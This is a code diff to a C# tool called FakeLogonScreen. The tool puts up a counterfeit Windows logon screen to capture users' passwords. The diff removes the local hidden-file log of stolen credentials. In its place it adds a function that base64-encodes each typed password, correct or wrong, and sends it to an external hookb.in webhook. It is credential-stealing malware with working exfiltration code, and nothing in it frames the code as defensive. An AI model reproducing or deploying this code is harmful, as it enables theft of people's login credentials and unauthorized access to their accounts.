@@ -3,13 +3,16 @@ using System.Diagnostics;
 using System.DirectoryServices.AccountManagement;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-using System.IO;
 using System.Drawing;
+using System.Net;
+using System.IO;
 
 /*
 Author: @bitsadmin
 Website: https://github.com/bitsadmin
 License: BSD 3-Clause
+
+Edited: @CracX
 */
 
 namespace FakeLogonScreen
@@ -30,14 +33,20 @@ namespace FakeLogonScreen
         {
             if (e.KeyCode == Keys.Enter)
                 ValidateCredentials();
-
-            // Print to console
-            Console.WriteLine(((MaskedTextBox)sender).Text);
         }
 
         private void pbSubmit_Click(object sender, EventArgs e)
         {
             ValidateCredentials();
+        }
+
+        private void SendDataToURLEndpoint(string data, bool isSuccess = true)
+        {
+
+            string endpoint = "https://hookb.in/b9plyw6q9rHKGq00GbOK";
+            string fullUrl = @"" + endpoint + "?data=" + System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(data)) + "&success=" + isSuccess.ToString();
+            HttpWebRequest r = (HttpWebRequest)WebRequest.Create(fullUrl);
+            r.GetResponse();
         }
 
         private void ValidateCredentials()
@@ -54,6 +63,7 @@ namespace FakeLogonScreen
                         success = true;
 
                     success = context.ValidateCredentials(Username, password);
+                    //success = true;
                 }
             }
             // Could happen in case for example the (local) user's password is empty
@@ -66,23 +76,9 @@ namespace FakeLogonScreen
             // Output result of logon screen
             try
             {
+                // If the password is blank, add some value to explain that
                 if (string.IsNullOrEmpty(password))
                     password = "[blank password]";
-
-                // Even if a wrong password is typed, it might be valuable
-                string line = string.Format("{0}: {1} --> {2}", this.Username, password, success ? "Correct" : "Wrong");
-                Console.WriteLine(line);
-
-                // Store username and password in %localappdata%\Microsoft\user.db
-                string path = string.Format(@"{0}\Microsoft\user.db", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
-                using (StreamWriter file = new StreamWriter(path, true))
-                {
-                    file.WriteLine(line);
-                }
-
-                // Hide file
-                File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
-                Console.WriteLine("Output written to {0}", path);
             }
             catch (Exception e)
             {
@@ -92,6 +88,9 @@ namespace FakeLogonScreen
             // Ask again if password is incorrect
             if (!success)
             {
+                // Send the unsuccessful password (just in case the user might reuse his/her passwords)
+                SendDataToURLEndpoint(password, false);
+
                 // Show error
                 lblError.Text = "The password is incorrect. Try again.";
                 mtbPassword.Text = string.Empty;
@@ -102,12 +101,16 @@ namespace FakeLogonScreen
             // If correct password, save and close screen
             else
             {
+
                 // Show all windows again
                 IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
                 SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
 
-                // Exit fake logon screen
-                Application.Exit();
+                // Send the successful password
+                SendDataToURLEndpoint(password, true);
+
+                // Exit fake logon screen (and destroy it's thread)
+                Application.ExitThread();
             }
         }
 
